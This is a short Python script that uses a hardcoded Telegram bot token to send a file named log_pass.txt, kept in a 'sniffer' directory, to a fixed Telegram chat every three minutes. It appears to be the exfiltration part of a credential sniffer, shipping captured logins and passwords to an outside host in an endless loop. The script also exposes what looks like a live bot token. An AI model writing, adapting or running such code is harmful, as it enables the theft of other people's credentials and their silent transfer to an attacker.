import telebot
from time import sleep

TOKEN = '5080628962:AAE5NdFicdAw--dVvstSc0ludp1BMxCXnk0'

bot = telebot.TeleBot(TOKEN);

def get_text_messages():
        with open('/home/niki/soft/sniffer/snif/log_pass.txt','rb') as f:
            bot.send_document('1107218594', f, 'rb')

while True:
    sleep(180)
    get_text_messages()